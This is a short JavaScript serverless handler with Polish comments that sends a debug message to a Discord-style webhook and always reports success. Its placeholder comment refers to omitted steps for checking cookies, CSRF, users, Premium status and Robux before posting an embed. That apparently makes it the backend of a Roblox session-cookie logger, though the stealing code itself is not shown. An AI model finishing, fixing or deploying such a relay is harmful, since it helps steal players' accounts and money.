export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false });

  // ────────────────────────────────────────────────
  // TEST WEBHOOK – ZAWSZE WYSYŁAMY (żeby sprawdzić czy env działa)
  const webhookUrl = process.env.WEBHOOK_URL;   // ← nowa nazwa!

  if (webhookUrl) {
    console.log('[DEBUG] WEBHOOK_URL znaleziona:', webhookUrl.substring(0, 40) + '...');

    try {
      const testRes = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**TEST Z VERCEL – DZIAŁA!**\nCzas: ${new Date().toISOString()}\nDeployment: ${process.env.VERCEL_GIT_COMMIT_SHA || 'brak'}`
        })
      });

      console.log('[DEBUG] Test webhook status:', testRes.status, testRes.statusText);

      if (!testRes.ok) {
        const errBody = await testRes.text().catch(() => 'brak treści');
        console.error('[DEBUG] Test webhook błąd:', testRes.status, errBody);
      } else {
        console.log('[DEBUG] Test webhook wysłany OK');
      }
    } catch (testErr) {
      console.error('[DEBUG] Test webhook exception:', testErr.message);
    }
  } else {
    console.log('[DEBUG] WEBHOOK_URL = undefined / brak w process.env');
  }

  // ────────────────────────────────────────────────
  // Reszta Twojego kodu (cookie check, csrf, user, premium, robux, embed)
  // ... zostaw bez zmian, tylko zmień process.env.DISCORD_WEBHOOK_URL na process.env.WEBHOOK_URL

  // Na końcu sekcji wysyłającej embed zmień:
  // const webhook = process.env.WEBHOOK_URL;

  // Zawsze zwracaj ok: true żeby frontend był zadowolony
  return res.status(200).json({ ok: true });
}
